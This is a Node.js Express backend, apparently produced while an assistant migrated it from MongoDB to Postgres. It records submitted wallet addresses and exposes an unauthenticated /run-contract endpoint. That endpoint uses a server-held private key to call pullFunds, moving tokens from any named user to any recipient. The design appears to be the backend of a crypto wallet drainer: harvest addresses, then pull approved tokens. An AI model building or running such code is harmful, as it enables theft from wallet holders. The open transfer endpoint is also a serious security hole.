import express from "express";
// import mongoose from "mongoose";   // ⛔ MongoDB disabled
import { PrismaClient } from "@prisma/client"; // ✅ Postgres + Prisma
import { ethers } from "ethers";
import dotenv from "dotenv";

dotenv.config();

const app = express();
app.use(express.json());

// -----------------------------
//  CONNECT POSTGRES (via Prisma)
// -----------------------------
const prisma = new PrismaClient();

(async () => {
  try {
    await prisma.$connect();
    console.log("Postgres Connected");
  } catch (err) {
    console.error("Postgres Connection Failed:", err.message);
  }
})();

// -----------------------------
//  USER MODEL (Mongo → Prisma)
// -----------------------------
// MongoDB version (kept commented, you asked not to remove anything)
//
// const UserSchema = new mongoose.Schema({
//   address: { type: String, required: true },
//   timestamp: { type: Date, default: Date.now },
// });
// const UserModel = mongoose.model("User", UserSchema);

// -----------------------------
//  STORE USER  (now uses Postgres)
// -----------------------------
app.post("/store-user", async (req, res) => {
  try {
    const { address } = req.body;

    if (!address) return res.json({ success: false, error: "Address required" });

    // Prisma (Postgres)
    await prisma.user.create({
      data: {
        address,
        timestamp: new Date(),
      },
    });

    res.json({
      success: true,
      message: "Address saved",
      address,
    });
  } catch (err) {
    res.json({ success: false, error: err.message });
  }
});

// -----------------------------
//  CONTRACT SETUP
// -----------------------------
let contract;
try {
  const provider = new ethers.JsonRpcProvider(process.env.RPC);
  const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

  const abi = [
    "function pullFunds(address token, address user, address recipient, uint256 amount) external"
  ];

  contract = new ethers.Contract(process.env.CONTRACT, abi, wallet);
  console.log("Contract Connected");
} catch (err) {
  console.error("Contract setup failed:", err.message);
}

// -----------------------------
//  RUN CONTRACT
// -----------------------------
app.post("/run-contract", async (req, res) => {
  try {
    const { token, user, recipient, amount } = req.body;

    if (!token || !user || !recipient || !amount)
      return res.json({ success: false, error: "All fields required" });

    const tx = await contract.pullFunds(token, user, recipient, amount);
    await tx.wait();

    res.json({
      success: true,
      message: "Transaction sent",
      hash: tx.hash,
    });
  } catch (err) {
    res.json({ success: false, error: err.message });
  }
});

// -----------------------------
//  START SERVER
// -----------------------------
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on PORT ${PORT}`));
